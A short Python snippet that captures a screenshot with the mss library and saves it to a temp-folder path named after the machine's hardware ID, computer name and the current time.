import mss, time, os, genHwid

serialNumber = genHwid.Gen().get_hwid_number() 
name = os.getenv("computername")
file_path = os.getenv("temp") + f"\\{serialNumber}__{name}"
current_time = time.strftime('%Y:%H:%M:%S').replace(":","")
name = ".png"
def ScreenShot():
    with mss.mss() as ss:
        ss.shot(output=file_path + "\\" + str(current_time) + name)
